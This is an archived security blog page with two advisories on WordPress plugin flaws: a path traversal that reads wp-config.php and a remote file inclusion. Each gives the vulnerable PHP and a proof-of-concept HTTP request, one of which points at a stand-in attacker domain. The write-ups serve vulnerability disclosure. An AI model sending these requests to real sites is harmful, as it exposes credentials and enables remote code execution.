<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>June | 2012 | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->


<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive date  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">
						Monthly Archives: <span>June 2012</span>					</h2>
				</header>

				
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-18" class="post-18 post type-post status-publish format-standard hentry category-advisories tag-mac-photo-gallery tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/" title="7:22 pm" rel="bookmark" class="entry-date"><time datetime="2012-06-21T19:22:06+00:00" pubdate>June 21, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/" title="Permalink to WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability" rel="bookmark">WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49650/">Secunia Advisory SA 49650</a></p>
<p><strong>Analysis<br />
</strong>This vulnerability relies on a lack of validation of the &#8220;albid&#8221; in <a href="http://plugins.svn.wordpress.org/mac-dock-gallery/tags/2.9/macdownload.php">macdownload.php</a>, which is passed straight into the path that is read at line 37 into the response. This cases an arbitrary file disclosure vulnerability.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b98087638272959" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once( dirname(__FILE__) . '/macDirectory.php');

$folder = dirname(plugin_basename(__FILE__));
$file = dirname(dirname(dirname(__FILE__)))."/uploads/mac-dock-gallery/".$_GET['albid'];

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b98087638272959-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-2">2</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-4">4</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-6">6</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-8">8</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-10">10</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-12">12</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-14">14</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b98087638272959-16">16</div><div class="crayon-num" data-line="crayon-53c9877b98087638272959-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b98087638272959-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/macDirectory.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b98087638272959-3"><span class="crayon-sy">$</span><span class="crayon-v">folder</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">plugin_basename</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-4"><span class="crayon-sy">$</span><span class="crayon-v">file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-e">dirname</span><span class="crayon-sy">(</span><span class="crayon-i">__FILE__</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/uploads/mac-dock-gallery/"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'albid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Description: File Transfer'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Type: application/octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Disposition: attachment; filename='</span><span class="crayon-sy">.</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Transfer-Encoding: binary'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Expires: 0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Pragma: public'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-Length: '</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_clean</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">flush</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b98087638272959-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b98087638272959-17"><span class="crayon-sy">?</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0068 seconds] -->
<p>If we make a request like this, it will cause the code to read out the wp-config.php file, which will contain database credentials in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b980a8323945257" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b980a8323945257-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b980a8323945257-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b980a8323945257-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">mac</span><span class="crayon-o">-</span><span class="crayon-i">dock</span><span class="crayon-o">-</span><span class="crayon-i">gallery</span><span class="crayon-o">/</span><span class="crayon-v">macdownload</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">albid</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b980a8323945257-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/mac-photo-gallery/" rel="tag">Mac Photo Gallery</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-mac-photo-gallery-plugin-albid-arbitrary-file-disclosure-vulnerability/#respond" title="Comment on WordPress Mac Photo Gallery plugin &#8220;albid&#8221; arbitrary file disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-18 -->

				
					
<article id="post-11" class="post-11 post type-post status-publish format-standard hentry category-advisories tag-nmedia-mailchimp-widget tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/" title="6:48 pm" rel="bookmark" class="entry-date"><time datetime="2012-06-21T18:48:54+00:00" pubdate>June 21, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability" rel="bookmark">WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49538/">Secunia Advisory SA 49538</a></p>
<p><strong>Analysis</strong><br />
This vulnerability is nothing but a textbook arbitrary file inclusion vulnerability. The file is used to interacting with the mailchimp API. But the very first 2 lines of executable code in <a href="http://plugins.svn.wordpress.org/nmedia-mailchimp-widget/tags/3.1/api_mailchimp/postToMailChimp.php">/api_mailchimp/postToMailChimp.php</a>, it goes ahead and accepts a path for loading a file.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9b962531782829" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$path = $_POST['abs_path'] . 'wp-load.php';
//echo $path; die;
require( $path );</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9b962531782829-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b962531782829-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9b962531782829-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9b962531782829-1"><span class="crayon-sy">$</span><span class="crayon-v">path</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'abs_path'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b962531782829-2"><span class="crayon-c">//echo $path; die;</span></div><div class="crayon-line" id="crayon-53c9877b9b962531782829-3"><span class="crayon-e">require</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">path</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
<p>By making following request, where the url has a file called &#8216;wp-load.php&#8217; or otherwise will return php code, or using the proof of concept code, we can exploit this</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9b972329381329" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php
HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

abs_path=http://myevildomain.com/</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9b972329381329-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b972329381329-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9b972329381329-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b972329381329-4">4</div><div class="crayon-num" data-line="crayon-53c9877b9b972329381329-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b972329381329-6">6</div><div class="crayon-num" data-line="crayon-53c9877b9b972329381329-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9b972329381329-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">nmedia</span><span class="crayon-o">-</span><span class="crayon-i">mailchimp</span><span class="crayon-o">-</span><span class="crayon-i">widget</span><span class="crayon-o">/</span><span class="crayon-i">api_mailchimp</span><span class="crayon-o">/</span><span class="crayon-v">postToMailChimp</span><span class="crayon-sy">.</span><span class="crayon-e">php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b972329381329-2"><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-53c9877b9b972329381329-3"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b972329381329-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span 